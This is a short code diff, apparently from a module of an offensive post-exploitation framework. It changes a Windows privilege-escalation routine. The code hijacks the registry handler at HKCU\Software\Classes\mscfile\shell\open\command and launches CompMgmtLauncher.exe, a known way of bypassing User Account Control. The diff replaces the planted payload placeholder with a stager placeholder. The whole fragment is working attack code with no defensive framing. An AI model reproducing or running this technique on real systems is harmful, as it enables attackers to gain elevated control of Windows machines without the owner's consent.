@@ -28,7 +28,7 @@ try
     }
 
     var path = 'Software\\Classes\\mscfile\\shell\\open\\command';
-    proton.registry.write(proton.registry.HKCU, path, '', '~PAYLOAD_DATA~', proton.registry.STRING);
+    proton.registry.write(proton.registry.HKCU, path, '', '~STAGER_DATA~', proton.registry.STRING);
 
     proton.shell.run("CompMgmtLauncher.exe", true);
 
